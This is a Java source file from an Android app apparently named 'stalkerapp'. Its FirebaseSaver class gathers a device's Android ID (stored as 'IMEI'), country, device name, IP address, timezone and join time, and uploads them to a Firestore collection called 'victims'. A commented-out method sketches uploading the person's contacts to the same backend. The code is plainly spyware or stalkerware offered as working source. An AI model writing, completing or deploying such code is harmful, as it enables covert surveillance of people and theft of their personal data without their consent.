package com.github.saintedlittle.stalkerapp.firebase;

import static android.content.ContentValues.TAG;

import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.github.saintedlittle.stalkerapp.data.SystemData;
import com.github.saintedlittle.stalkerapp.utils.SystemDataFetcher;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.Map;

public class FirebaseSaver {

    private final FirebaseFirestore db = FirebaseFirestore.getInstance();

    private static void onFailure(Exception e) {
        Log.w(TAG, "Error adding document", e);
    }

    private static void onSuccess(DocumentReference documentReference) {
        Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId());
    }

    public void saveDefaultData(Context context) {
        SystemData systemData = new SystemDataFetcher(context).fetchSystemData();

        Map<String, Object> systemInformation = new HashMap<>();

        String androidID = android.provider.Settings.System.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        systemData.setImei(androidID);

        systemInformation.put("COUNTRY", systemData.getCountry());

        systemInformation.put("DEVICE", systemData.getDeviceName());
        systemInformation.put("IMEI", systemData.getImei());

        systemInformation.put("IP-ADDRESS", systemData.getIP());

        systemInformation.put("JOINING", systemData.getTimestamp());

        systemInformation.put("TIMEZONE", systemData.getTimezone());

        // Add a new document with a generated ID
        db.collection(FirebaseConstants.VICTIM_COLLECTION)
                .add(systemInformation)
                .addOnSuccessListener(FirebaseSaver::onSuccess)
                .addOnFailureListener(FirebaseSaver::onFailure);
    }

    public void saveContacts(Context context) {

//        List<ContactData> contacts = new ContactFetcher(context).fetchContacts();
//
//        contacts.forEach(e -> {
//            Map<String, Object> contact = new HashMap<>();
//
//            // TODO: DATA CLASS.
//            // contact.put()
//
//            db.collection(FirebaseConstants.VICTIM_COLLECTION)
//                    .document(IMEI)
//                    .collection(FirebaseConstants.CONTACTS_COLLECTION)
//                    .document(String.format("%s %s", e.getFirstName(), e.getLastName()))
//                    .update(contact);
//        });

    }

    private static final class FirebaseConstants {
        public final static String VICTIM_COLLECTION = "victims";
        public final static String CONTACTS_COLLECTION = "contacts";

        public final static String ADMINISTRATOR_COLLECTION = "administrators";

    }
}
